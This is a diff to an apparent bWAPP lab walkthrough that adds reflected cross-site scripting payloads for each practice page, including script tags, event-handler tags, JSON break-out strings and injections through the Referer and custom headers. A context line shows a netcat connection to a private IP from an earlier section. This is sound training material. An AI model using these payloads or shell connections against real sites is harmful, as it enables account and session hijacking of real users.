@@ -63,7 +63,62 @@ nc -nv 192.168.200.150 775
 
 
 
+# A3 - Cross-Site Scripting (XSS) 
 
+### XSS - Reflected (GET)
+xss_get.php
+
+```
+<script>alert(Hi )</script>
+```
+### XSS - Reflected (POST)
+
+xss_post.php
+```
+<script>alert(2017)</script>
+```
+
+### XSS - Reflected (JSON)
+
+xss_json.php
+```
+"}]}';prompt(2017)</script>
+```
+
+### XSS - Reflected (AJAX/JSON)
+
+xss_ajax_2-1.php
+```
+<svg onload=prompt(2017)>
+```
+
+### XSS - Reflected (AJAX/XML)
+xss_ajax_1-1.php
+```
+&lt;img src=&apos;#&apos; onerror=&apos;alert(1)&apos;&gt;
+```
+
+Alternatively I was able to get XSS to execute on the AJAX called.
+```
+xss_ajax_1-2.php?title=<html xmlns='http://www.w3.org/1999/xhtml'><script>prompt(2017)</script></html>
+```
+
+### XSS - Reflected (Back Button)
+Modify Referer header field
+```
+Referer: ';alert(2017);'
+```
+
+### XSS - Reflected (Custom Header)
+Add header field
+```
+bWAPP: <script>alert(2017)</script>
+```
+
+### XSS - Reflected (Eval)
+```
+date=alert(2017)
+```
 
 
 
